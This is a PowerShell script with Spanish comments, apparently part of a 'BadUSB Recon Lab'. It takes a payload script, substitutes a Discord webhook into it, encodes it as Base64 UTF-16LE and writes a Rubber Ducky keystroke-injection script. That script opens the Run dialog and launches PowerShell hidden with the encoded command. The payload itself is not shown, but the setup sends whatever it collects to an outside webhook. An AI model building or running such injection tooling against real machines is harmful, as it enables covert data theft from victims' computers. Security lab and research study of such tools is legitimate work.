# ============================================================
# BadUSB Recon — Generador de Base64 UTF-16LE + Ducky Script
# ------------------------------------------------------------
# Uso:
#   .\encode_base64.ps1                              # pide webhook por consola
#   .\encode_base64.ps1 -Webhook "https://..."      # webhook como parámetro
#   .\encode_base64.ps1 -Webhook "..." -NoVerify    # sin verificación
# ============================================================

param(
    [string]$Webhook,
    [switch]$NoVerify
)

$ErrorActionPreference = "Stop"

# Rutas
$repoRoot    = Split-Path -Parent $PSScriptRoot
$payloadPath = Join-Path $PSScriptRoot "payload.ps1"
$b64Path     = Join-Path $repoRoot "payload.b64.txt"
$duckyPath   = Join-Path $repoRoot "payload_ducky.txt"

if (-not (Test-Path $payloadPath)) {
    Write-Host "[-] No se encuentra payload.ps1 en $PSScriptRoot" -ForegroundColor Red
    exit 1
}

# ------------------------------------------------------------
# 1. Obtener el webhook
# ------------------------------------------------------------
if (-not $Webhook) {
    $configPath = Join-Path $repoRoot "config.local.ps1"
    if (Test-Path $configPath) {
        . $configPath
        if ($Config.Webhook -and $Config.Webhook -notlike "*XXX*") {
            $Webhook = $Config.Webhook
            Write-Host "[+] Webhook cargado desde config.local.ps1" -ForegroundColor Green
        }
    }
}

if (-not $Webhook) {
    Write-Host ""
    Write-Host "Pega tu webhook de Discord (o deja vacío para cancelar):" -ForegroundColor Yellow
    $Webhook = Read-Host "Webhook"
}

if (-not $Webhook -or $Webhook -notmatch "^https?://") {
    Write-Host "[-] Webhook no válido. Abortando." -ForegroundColor Red
    exit 1
}

# ------------------------------------------------------------
# 2. Cargar payload y sustituir el placeholder
# ------------------------------------------------------------
$script = Get-Content -Raw -Path $payloadPath
$originalScript = $script

# Reemplaza el placeholder por el webhook real
$script = $script -replace 'PLACEHOLDER_WEBHOOK', $Webhook

# ------------------------------------------------------------
# 3. Codificar a UTF-16LE -> Base64
# ------------------------------------------------------------
$bytes = [System.Text.Encoding]::Unicode.GetBytes($script)
$b64   = [Convert]::ToBase64String($bytes)

[IO.File]::WriteAllText($b64Path, $b64)
Write-Host "[+] Base64 generado: $b64Path" -ForegroundColor Green
Write-Host "[+] Longitud: $($b64.Length) caracteres" -ForegroundColor Cyan

# ------------------------------------------------------------
# 4. Verificación (decodifica y compara)
# ------------------------------------------------------------
if (-not $NoVerify) {
    $decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64))
    if ($decoded -eq $script) {
        Write-Host "[+] Verificación OK: el Base64 decodifica exactamente al script inyectado." -ForegroundColor Green
    } else {
        Write-Host "[-] Verificación FALLIDA. Algo no cuadra." -ForegroundColor Red
        [IO.File]::WriteAllText((Join-Path $repoRoot "_decoded_check.ps1"), $decoded)
        exit 1
    }
} else {
    Write-Host "[!] Verificación omitida (-NoVerify)." -ForegroundColor Yellow
}

# ------------------------------------------------------------
# 5. Generar Ducky Script
# ------------------------------------------------------------
$ducky = @"
REM BadUSB Recon Lab — Payload generado automáticamente
REM Fecha: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
REM IMPORTANTE: no subir este archivo al repo (contiene tu webhook)

DUCKY_LANG es
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1200
STRING powershell -WindowStyle Hidden -EncodedCommand $b64
ENTER
"@
[IO.File]::WriteAllText($duckyPath, $ducky)
Write-Host "[+] Ducky Script generado: $duckyPath" -ForegroundColor Green

# ------------------------------------------------------------
# Resumen
# ------------------------------------------------------------
Write-Host ""
Write-Host "=== RESUMEN ===" -ForegroundColor Yellow
Write-Host "  Payload   : $payloadPath ($($originalScript.Length) chars originales)"
Write-Host "  Base64    : $b64Path ($($b64.Length) chars)"
Write-Host "  Ducky     : $duckyPath"
Write-Host ""
Write-Host "  Recuerda:" -ForegroundColor Yellow
Write-Host "   - payload.b64.txt y payload_ducky.txt están en .gitignore"
Write-Host "   - Si compartes el Ducky Script, cualquiera verá tu webhook"
Write-Host "   - Regenera tu webhook si se filtra"